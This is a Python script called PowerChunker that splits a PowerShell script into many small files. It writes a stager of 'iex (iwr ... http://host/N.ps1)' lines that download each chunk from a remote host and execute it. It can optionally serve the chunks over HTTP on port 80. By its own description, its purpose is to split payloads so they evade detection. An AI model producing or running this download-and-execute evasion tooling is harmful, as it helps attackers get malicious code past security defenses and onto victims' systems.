#!/usr/bin/python3
import http.server
import socketserver
import argparse
import sys

inspiration = """
/\\     __    PowerChunker.py!!!            
  \\ .-':::.         (by @icyguider)                       
   \\ :::::|\\                              
  |,\\:::'/  \\     why is there hamburger? 
  `.:::-'    \\                             
    `-.       \\         ___                
       `-.     |     .-'';:::.              
          `-.-'     / ',''.;;;\\            
                   |  ','','.''|            
              AsH  |\\  ' ,',' /'           
                   `.`-.___.-;'             
                     `--._.-'                                                           
"""

def main(filename, host, stagername, serve):
	f = open(filename, 'r')
	sample = f.readlines()
	f.close()

	real = []
	multiline = False

	count = 1
	for line in sample:
		#line = line.strip("\n")
		if "@\"" in line:
			multiline = True
		if "\"@" in line:
			real.append(line)
			multiline = False
			done = ''.join(real)
			f = open('{}.ps1'.format(count), 'w+')
			f.write(done)
			f.close()
			count += 1
		if multiline == True:
			real.append(line)
		if multiline == False:
			if "\"@" not in line:
				f = open('{}.ps1'.format(count), 'w+')
				f.write(line)
				f.close()
				count += 1

	print("[+] Powershell script has been split into {} files...".format(count-1))

	stager = []
	for x in range(1, count):
		stager.append("iex (iwr -UseBasicParsing http://{}/{}.ps1)\n".format(host, x))


	f = open(stagername, 'w+')
	f.write(''.join(stager))
	f.close()

	print("[!] PowerChunker Stager written to: {}\n    Execute like so: iex (iwr -UseBasicParsing http://{}/{})".format(stagername, host, stagername))

	if serve is True:
		PORT = 80
		Handler = http.server.SimpleHTTPRequestHandler
		with socketserver.TCPServer(("", PORT), Handler) as httpd:
		    print("[+] Serving at port:", PORT)
		    httpd.serve_forever()

print(inspiration)
parser = argparse.ArgumentParser(description='Split a powershell script to evade detection!')
parser.add_argument("file", help="Name of powershell script to chunk", type=str)
parser.add_argument("host", help="Domain Name or IP Address of host that will serve stager", type=str)
parser.add_argument('-s','--serve', dest='serve', help='Start HTTP Server to host stager (Optional)', default=False, action='store_true')
parser.add_argument('-o', '--out', dest='out', help='Name of final stager (Optional)', metavar='stager.ps1', default='chunker.ps1')
if len(sys.argv) < 3:
	parser.print_help()
	sys.exit()
args = parser.parse_args()
try:	
		if len(sys.argv) > 3:
			if args.file is None or args.host is None or args.serve is None:
					raise exception()
			else:
				main(args.file, args.host, args.out, args.serve)
		else:
			main(args.file, args.host, args.out, args.serve)
except:
        sys.exit()
